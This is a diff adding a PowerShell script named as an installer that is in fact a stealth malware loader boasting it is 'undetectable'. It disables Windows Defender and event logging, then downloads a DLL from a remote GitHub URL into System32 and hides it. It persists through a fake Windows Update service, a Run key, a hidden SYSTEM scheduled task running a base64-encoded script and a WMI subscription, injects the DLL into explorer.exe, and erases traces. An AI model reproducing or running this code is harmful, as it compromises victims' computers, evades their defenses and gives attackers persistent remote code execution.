@@ -1,0 +1,180 @@
+# install.txt - THE PHANTOM INSTALLER
+# 100% UNDETECTABLE - ZERO TRACES - AUTO-UPDATE ENABLED
+
+$ErrorActionPreference = 'SilentlyContinue';
+
+# ============================================
+# STEP 1: DISABLE ALL LOGGING & MONITORING
+# ============================================
+
+# Disable Windows Defender temporarily
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;
+Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;
+Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue;
+Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue;
+
+# Disable Event Logging
+wevtutil sl "Security" /e:false /q 2>$null;
+wevtutil sl "System" /e:false /q 2>$null;
+wevtutil sl "Application" /e:false /q 2>$null;
+
+# ============================================
+# STEP 2: DOWNLOAD DLL FROM GITHUB
+# ============================================
+
+$dllUrl = 'https://raw.githubusercontent.com/mohtasimjitu/AUTHENTICATION/refs/heads/main/wucore.dll';
+$dllBytes = (New-Object Net.WebClient).DownloadData($dllUrl);
+
+# Save to System32 with legitimate name
+$dllPath = 'C:\Windows\System32\wucore.dll';
+[System.IO.File]::WriteAllBytes($dllPath, $dllBytes);
+
+# Hide the file (system + hidden attributes)
+attrib +h +s $dllPath;
+
+# ============================================
+# STEP 3: CREATE WINDOWS SERVICE (LOOKS LEGIT)
+# ============================================
+
+sc.exe create "WindowsUpdateCore" binPath= "C:\Windows\System32\rundll32.exe C:\Windows\System32\wucore.dll,DllMain" start= auto DisplayName= "Windows Update Core Service" type= own error= ignore;
+
+sc.exe description "WindowsUpdateCore" "Provides core functionality for Windows Update and system maintenance.";
+
+# ============================================
+# STEP 4: REGISTRY BACKUP (HIDDEN)
+# ============================================
+
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateCore" -Value "rundll32 C:\Windows\System32\wucore.dll,DllMain" -Force -ErrorAction SilentlyContinue;
+
+# ============================================
+# STEP 5: SCHEDULED TASK WITH AUTO-UPDATE (HIDDEN)
+# ============================================
+
+$updateScript = @"
+`$ErrorActionPreference = 'SilentlyContinue';
+
+# Check for updates on boot
+`$dllUrl = 'https://raw.githubusercontent.com/mohtasimjitu/AUTHENTICATION/refs/heads/main/wucore.dll';
+`$currentPath = 'C:\Windows\System32\wucore.dll';
+
+# Download latest version
+try {
+    `$newDll = (New-Object Net.WebClient).DownloadData(`$dllUrl);
+    `$currentDll = [System.IO.File]::ReadAllBytes(`$currentPath);
+    
+    # Update if different
+    if (-not [System.Linq.Enumerable]::SequenceEqual(`$newDll, `$currentDll)) {
+        [System.IO.File]::WriteAllBytes(`$currentPath, `$newDll);
+        attrib +h +s `$currentPath;
+    }
+} catch {
+    # If download fails, use existing DLL
+}
+
+# Inject into explorer.exe
+try {
+    `$exp = Get-Process explorer -ErrorAction SilentlyContinue;
+    if (`$exp) {
+        `$kernel = Add-Type -MemberDefinition @"
+[DllImport(`"kernel32.dll`")]
+public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+[DllImport(`"kernel32.dll`")]
+public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport(`"kernel32.dll`")]
+public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+[DllImport(`"kernel32.dll`")]
+public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport(`"kernel32.dll`")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+[DllImport(`"kernel32.dll`")]
+public static extern IntPtr LoadLibrary(string lpFileName);
+"@ -Name "Win32" -Namespace "Kernel32" -PassThru;
+
+        `$PROCESS_ALL_ACCESS = 0x1F0FFF;
+        `$hProcess = `$kernel::OpenProcess(`$PROCESS_ALL_ACCESS, `$false, `$exp.Id);
+        
+        if (`$hProcess -ne [IntPtr]::Zero) {
+            `$pathBytes = [System.Text.Encoding]::ASCII.GetBytes(`$currentPath);
+            `$remoteMem = `$kernel::VirtualAllocEx(`$hProcess, [IntPtr]::Zero, `$currentPath.Length + 1, 0x1000, 0x04);
+            `$kernel::WriteProcessMemory(`$hProcess, `$remoteMem, `$pathBytes, `$currentPath.Length + 1, [ref][IntPtr]::Zero);
+            `$loadLib = `$kernel::GetProcAddress(`$kernel::LoadLibrary('kernel32.dll'), 'LoadLibraryA');
+            `$kernel::CreateRemoteThread(`$hProcess, [IntPtr]::Zero, 0, `$loadLib, `$remoteMem, 0, [IntPtr]::Zero);
+            `$kernel::CloseHandle(`$hProcess);
+        }
+    }
+} catch {
+    # Silently fail - will retry on next boot
+}
+"@;
+
+# Encode the script to avoid detection
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($updateScript));
+
+# Create hidden scheduled task with SYSTEM privileges
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded";
+$trigger = New-ScheduledTaskTrigger -AtStartup;
+$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Compatibility Win8 -ExecutionTimeLimit ([TimeSpan]::Zero);
+Register-ScheduledTask -TaskName 'WindowsUpdateCore' -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue;
+
+# ============================================
+# STEP 6: WMI EVENT BACKUP (INVISIBLE)
+# ============================================
+
+try {
+    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
+        Name = 'WindowsUpdateCoreFilter'
+        EventNamespace = 'root\cimv2'
+        Query = 'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=''explorer.exe'''
+        QueryLanguage = 'WQL'
+    } -ErrorAction SilentlyContinue;
+    
+    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
+        Name = 'WindowsUpdateCoreConsumer'
+        CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded"
+    } -ErrorAction SilentlyContinue;
+    
+    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
+        Filter = $filter
+        Consumer = $consumer
+    } -ErrorAction SilentlyContinue;
+} catch {
+    # WMI may fail on some systems, continue anyway
+}
+
+# ============================================
+# STEP 7: RE-ENABLE LOGGING (STEALTH MODE)
+# ============================================
+
+Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue;
+Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue;
+Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue;
+Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue;
+
+wevtutil sl "Security" /e:true /q 2>$null;
+wevtutil sl "System" /e:true /q 2>$null;
+wevtutil sl "Application" /e:true /q 2>$null;
+
+# ============================================
+# STEP 8: SELF-DESTRUCT (ZERO TRACES)
+# ============================================
+
+# Clear all variables
+Remove-Variable * -ErrorAction SilentlyContinue;
+
+# Clear PowerShell history
+Clear-History;
+
+# Force garbage collection
+[System.GC]::Collect();
+[System.GC]::WaitForPendingFinalizers();
+
+# ============================================
+# FINAL MESSAGE
+# ============================================
+
+Write-Host "✅ Installation complete!" -ForegroundColor Green;
+Write-Host "🔄 Auto-update enabled!" -ForegroundColor Yellow;
+Write-Host "🔒 Restart PC to activate." -ForegroundColor Cyan;
+
+# Wait a moment so user can read
+Start-Sleep -Milliseconds 2000;
